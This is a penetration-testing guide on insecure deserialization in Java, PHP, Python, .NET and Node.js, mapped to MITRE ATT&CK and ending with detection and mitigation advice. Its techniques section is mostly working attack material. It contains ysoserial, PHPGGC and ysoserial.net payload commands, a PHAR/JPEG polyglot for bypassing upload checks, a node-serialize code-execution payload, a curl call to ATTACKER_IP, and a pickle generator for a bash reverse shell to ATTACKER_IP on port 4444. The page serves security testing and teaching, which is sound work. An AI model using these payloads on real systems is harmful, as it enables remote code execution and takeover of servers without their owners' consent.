% Filename: 04-web-testing/file-attacks/deserialization.md
% Display name: Insecure Deserialization
% Last update: 2026-02-11
% ATT&CK Tactics: TA0001 (Initial Access), TA0002 (Execution)
% ATT&CK Techniques: T1190 (Exploit Public-Facing Application), T1059 (Command and Scripting Interpreter)
% Authors: @TristanInSec

# Insecure Deserialization

## Overview

Insecure deserialization occurs when an application deserializes (reconstructs objects from) untrusted data without validation. Attackers craft malicious serialized objects that, when deserialized, trigger unintended code execution through "gadget chains" — sequences of existing class methods that chain together to achieve arbitrary effects. The impact ranges from denial of service to remote code execution.

Deserialization vulnerabilities exist across all major languages — Java, PHP, Python, .NET, Ruby, Node.js — each with distinct serialization formats and exploitation techniques.

## ATT&CK Mapping

- **Tactic:** TA0001 - Initial Access
- **Technique:** T1190 - Exploit Public-Facing Application
- **Tactic:** TA0002 - Execution
- **Technique:** T1059 - Command and Scripting Interpreter

## Prerequisites

- Application deserializes user-controlled data (cookies, POST parameters, API fields, message queues)
- Libraries with known gadget chains are present in the application's classpath/dependencies
- No integrity checking (signing/MAC) on serialized data, or the key is compromised

## Detection Methodology

### Identifying Serialized Data

Look for serialized objects in:

- **Cookies** — base64-encoded blobs, especially in Java (ViewState, session data) and PHP applications
- **Hidden form fields** — particularly in Java frameworks (JSF ViewState)
- **API request/response bodies** — unusual binary or encoded data
- **Message queue payloads** — JMS, RabbitMQ, Redis
- **File uploads** — serialized object files

### Recognizing Serialization Formats

**Java serialized objects:**

```bash
# Hex signature: AC ED 00 05
# Base64 starts with: rO0AB
# Content-Type: application/x-java-serialized-object
```

```bash
# Detect Java serialized data in base64
echo "rO0ABXNyAA..." | base64 -d | xxd | head -1
# Should show: aced 0005 (magic bytes)
```

**PHP serialized objects:**

```bash
# Text format starting with type indicators:
O:4:"User":2:{s:4:"name";s:5:"admin";s:4:"role";s:5:"admin";}
a:2:{i:0;s:5:"hello";i:1;s:5:"world";}

# O: = Object, a: = Array, s: = String, i: = Integer
```

**Python pickle:**

```bash
# Binary format with opcodes
# Often base64-encoded in cookies/parameters
# Starts with \x80\x04\x95 (protocol 4) or \x80\x03 (protocol 3)
```

**.NET ViewState:**

```bash
# Base64-encoded string in __VIEWSTATE parameter
# Starts with /wEP (base64 of ObjectStateFormatter/LosFormatter header)
```

**Node.js (node-serialize):**

```bash
# JSON with function notation:
{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('id')}()"}
```

## Techniques

### Java Deserialization

Java deserialization is the most impactful — large classpaths with many libraries create extensive gadget chains. The primary tool is ysoserial.

```bash
# ysoserial
# https://github.com/frohoff/ysoserial
# Usage: java -jar ysoserial.jar [gadget] '[command]'

# Generate payload for Commons Collections (most common)
java -jar ysoserial.jar CommonsCollections1 'id' > payload.bin

# Common gadget chains (library must be in target's classpath):
# CommonsCollections1-7  (Apache Commons Collections)
# CommonsBeanutils1      (Apache Commons Beanutils)
# Spring1/Spring2        (Spring Framework)
# Hibernate1/Hibernate2  (Hibernate ORM)
# Groovy1                (Apache Groovy)
# JRMPClient/JRMPListener (Java RMI)
# Jdk7u21                (JDK 7u21 and below — no external deps)
# URLDNS                 (DNS lookup — no external deps, useful for detection)
```

**Exploiting Java deserialization:**

```bash
# Generate and send payload as base64
java -jar ysoserial.jar CommonsCollections1 'curl http://ATTACKER_IP:8000/proof' | base64 -w0

# Send as base64 in cookie/parameter
curl -b "session=<base64_payload>" http://target.com/api

# Send raw bytes in POST body
java -jar ysoserial.jar CommonsCollections1 'id' | curl -X POST \
  -H "Content-Type: application/x-java-serialized-object" \
  --data-binary @- http://target.com/api

# URLDNS chain for blind detection (triggers DNS lookup, no RCE)
java -jar ysoserial.jar URLDNS 'http://BURP_COLLABORATOR_URL' | base64 -w0
```

ysoserial is not pre-installed on Kali. Download from [GitHub releases](https://github.com/frohoff/ysoserial/releases) or build from source (requires Java + Maven).

**Java ViewState (JSF):**

JSF applications store state in the `javax.faces.ViewState` parameter. If not encrypted or signed (or if the key is known/default):

```bash
# Check if ViewState is base64-encoded Java serialization
echo "<viewstate_value>" | base64 -d | xxd | head -1
# If starts with aced0005 → Java serialized, potentially exploitable
```

### PHP Deserialization

PHP's `unserialize()` function reconstructs objects from serialized strings. Exploitation requires:
1. User-controlled data reaching `unserialize()`
2. A class with useful "magic methods" (`__wakeup()`, `__destruct()`, `__toString()`) in the application or its dependencies

**Manipulating serialized objects:**

```php
# Original serialized user object
O:4:"User":2:{s:4:"name";s:5:"admin";s:4:"role";s:4:"user";}

# Modified — change role to admin
O:4:"User":2:{s:4:"name";s:5:"admin";s:4:"role";s:5:"admin";}
```

```bash
# PHPGGC (PHP Generic Gadget Chains)
# https://github.com/ambionics/phpggc
# List available chains
./phpggc -l

# Filter chains by framework
./phpggc -l laravel

# Get detailed info about a chain
./phpggc -i Symfony/RCE1

# Generate payload — function call style (function + argument)
./phpggc Symfony/RCE4 system id

# Generate payload — command execution style
./phpggc Symfony/RCE1 id

# Base64 encode for transport
./phpggc -b Laravel/RCE1 system id

# URL encode
./phpggc -u Slim/RCE1 system id

# Generate PHAR archive (for phar:// deserialization)
./phpggc -p phar -o exploit.phar Monolog/RCE1 system id

# Generate polyglot JPEG/PHAR (bypass image validation)
./phpggc -pj dummy.jpg -o exploit.jpg Monolog/RCE1 system id
```

The target application must use the specific framework/library matching the gadget chain. Verify the target's dependencies before selecting a chain.

**Phar deserialization:**

PHP's `phar://` wrapper triggers deserialization of the PHAR archive's metadata when filesystem functions (`file_exists()`, `file_get_contents()`, `is_dir()`, etc.) process a `phar://` path:

```text
?file=phar:///var/www/uploads/exploit.phar
```

`file_exists()`, `file_get_contents()`, `is_dir()`, `fopen()`, and similar functions all trigger phar metadata deserialization. Combine with file upload to deliver the PHAR, then trigger via LFI or any filesystem function that accepts user-controlled paths.

### Python Deserialization (Pickle)

Python's `pickle` module executes arbitrary code during deserialization by design — there is no safe way to unpickle untrusted data.

**Generating malicious pickle:**

```python
import pickle
import base64
import os

class Exploit:
    def __reduce__(self):
        return (os.system, ('id',))

payload = base64.b64encode(pickle.dumps(Exploit()))
print(payload.decode())
```

**Reverse shell via pickle:**

```python
import pickle
import base64

class ReverseShell:
    def __reduce__(self):
        import os
        return (os.system, ('bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1',))

payload = base64.b64encode(pickle.dumps(ReverseShell()))
print(payload.decode())
```

**Common locations for pickle data:**

- Flask session cookies (if configured to use `pickle` serializer instead of the default JSON)
- Django cache backends
- Celery task serialization (if configured with pickle)
- Machine learning model files (`.pkl`, `.pickle`)
- Redis/Memcached cached objects

### .NET Deserialization

.NET deserialization via `BinaryFormatter`, `ObjectStateFormatter`, `NetDataContractSerializer`, `SoapFormatter`, and others.

**ViewState exploitation:**

ASP.NET ViewState uses `ObjectStateFormatter`. If MAC validation is disabled or the machine key is known:

```bash
# ysoserial.net (Windows only)
# https://github.com/pwntester/ysoserial.net
# Usage: ysoserial.exe -g [gadget] -f [formatter] -c '[command]'

# Generate ViewState payload
ysoserial.exe -g TypeConfuseDelegate -f ObjectStateFormatter -c "cmd /c whoami"

# BinaryFormatter payload
ysoserial.exe -g ActivitySurrogateSelector -f BinaryFormatter -c "cmd /c calc"

# Json.Net payload
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "calc" -o raw

# Output format options: -o raw|base64|raw-urlencode|base64-urlencode|hex
# Key gadgets: TypeConfuseDelegate, ObjectDataProvider, ActivitySurrogateSelector,
#              TextFormattingRunProperties, WindowsIdentity, PSObject, DataSet
# Key formatters: BinaryFormatter, ObjectStateFormatter, LosFormatter,
#                 SoapFormatter, Json.Net, NetDataContractSerializer
```

**Identifying vulnerable .NET ViewState:**

- Check for `__VIEWSTATE` parameter in forms
- If `ViewStateUserKey` is not set and MAC validation is weak, it may be exploitable
- `__VIEWSTATEGENERATOR` and `__EVENTVALIDATION` fields indicate ViewState usage

### Node.js Deserialization

The `node-serialize` library (and similar) can execute functions during deserialization:

```json
{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('id', function(error, stdout, stderr) { /* callback */ })}()"}
```

The `_$$ND_FUNC$$_` prefix tells node-serialize this is a function to be reconstructed. The trailing `()` causes immediate execution.

## Detection Methods

### Network-Based Detection

- Java serialization magic bytes (`aced0005` or base64 `rO0AB`) in HTTP requests
- PHP serialized object notation (`O:`, `a:`, `s:`) in cookies or parameters
- Base64-encoded binary blobs in unexpected locations (cookies, form fields)
- Requests to endpoints with `Content-Type: application/x-java-serialized-object`
- Known ysoserial class names in network traffic (e.g., `org.apache.commons.collections.functors.InvokerTransformer`)

### Host-Based Detection

- Unexpected process spawning from web application (e.g., Java process executing `bash`, `cmd`, `powershell`)
- ClassNotFoundException errors in Java logs for gadget chain classes (indicates failed exploitation attempts)
- PHP errors related to `unserialize()` with unexpected class names
- Python pickle load errors in application logs

## Mitigation Strategies

- **Do not deserialize untrusted data** — the most effective defense. Use safe data formats (JSON, XML, Protocol Buffers) instead of native serialization
- **Integrity checking** — sign serialized data with HMAC. Verify the signature before deserialization. Ensure the signing key is strong and not a default value
- **Type whitelisting** — if deserialization is unavoidable, restrict which classes can be deserialized:
  - Java: use `ObjectInputFilter` (Java 9+) or libraries like `SerialKiller`
  - PHP: use `allowed_classes` parameter in `unserialize()`
  - .NET: implement `SerializationBinder` to restrict types
- **Remove dangerous libraries** — remove unused libraries with known gadget chains from the classpath (Apache Commons Collections, etc.)
- **Monitor and alert** — log deserialization events and alert on unexpected class loading or process spawning
- **Migrate from dangerous serializers** — replace `BinaryFormatter` (.NET), `pickle` (Python), native `ObjectInputStream` (Java) with safer alternatives. .NET recommends `System.Text.Json`

## References

### Tools

- [ysoserial - Java Deserialization Exploit Tool](https://github.com/frohoff/ysoserial)
- [PHPGGC - PHP Generic Gadget Chains](https://github.com/ambionics/phpggc)
- [ysoserial.net - .NET Deserialization Exploit Tool](https://github.com/pwntester/ysoserial.net)

### Pentest Guides & Research

- [PortSwigger Web Security Academy - Insecure Deserialization](https://portswigger.net/web-security/deserialization)
- [OWASP - Deserialization Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html)

### MITRE ATT&CK

- [T1190 - Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190/)
- [T1059 - Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059/)
